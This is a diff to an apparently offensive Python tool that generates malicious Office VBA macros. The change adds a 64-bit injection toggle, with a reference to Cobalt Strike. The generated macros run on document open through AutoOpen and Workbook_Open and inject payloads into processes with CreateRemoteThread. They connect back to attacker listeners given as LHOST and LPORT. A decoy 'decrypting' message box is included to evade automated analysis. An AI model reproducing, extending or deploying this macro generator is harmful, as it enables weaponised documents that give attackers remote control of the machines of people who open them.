@@ -85,6 +85,7 @@ parser.add_argument("lhost64", help="LHOST for x64 to connect/bind to")
 parser.add_argument("lhost86", help="LHOST for x86 to connect/bind to")
 parser.add_argument("lport64", help="LPORT for x64 to connect/bind to")
 parser.add_argument("lport86", help="LPORT for x86 to connect/bind to")
+parser.add_argument("--inject64", dest="inject64", default=True, help="Inject into 64 Bit. Set to False for CobaltStrike")
 parser.add_argument("--out", default="wepwnise.txt", help="File to output the VBA macro to")
 parser.add_argument("--msgbox", default=True, dest="msgbox", help="Present messagebox to prevent automated analysis")
 parser.add_argument("--msg", default="This document will begin decrypting, please allow up to 5 minutes", dest="msg", 
@@ -263,6 +264,9 @@ lines1 = ["Private Const PROCESS_ALL_ACCESS = &H1F0FFF\r\n",
 "hStdError As Long\r\n",
 "End Type\r\n",
 "#End If\r\n",
+
+# INJECT64 BOOLEAN
+"Dim inject64 As Boolean\r\n",
 
 #IS OFFICE 64 bit
 "Public Function IsOffice64Bit() As Boolean\r\n",
@@ -486,6 +490,7 @@ lines1 +=  ["Dim vFile As Variant\r\n",
 "b64 = False\r\n",
 "b64 = IsWow64(hProcess)\r\n",
 "If b64 = True Then\r\n",
+"If inject64 = True Then\r\n",
 "If hProcess = 0 Then\r\n",
 "Exit Function\r\n",
 "End If\r\n",
@@ -538,6 +543,7 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "End If\r\n",
 "If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
 "Inject = 1 'Success\r\n",
+"End If\r\n",
 "Else\r\n",
 "If hProcess = 0 Then\r\n",
 "Exit Function\r\n",
@@ -633,10 +639,17 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "End If\r\n",
 "End Function\r\n",
 "Sub AutoOpen()\r\n",
+
+#Inject64
+"inject64 = %s\r\n" % str(args.inject64),
+
 "DieTotal\r\n",
 "AutoPwn\r\n",
 "End Sub\r\n",
 "Sub Workbook_Open()\r\n",
+
+#Inject64
+"inject64 = %s\r\n" % str(args.inject64),
 "DieTotal\r\n",
 "AutoPwn\r\n",
 "End Sub\r\n"]
@@ -659,3 +672,4 @@ print colored("[*] Please start up your x64 listener on %s:%s" % (args.lhost64,a
 print colored("[*] Please start up your x86 listener on %s:%s" % (args.lhost86,args.lport86), "blue")
 
 print ""
+
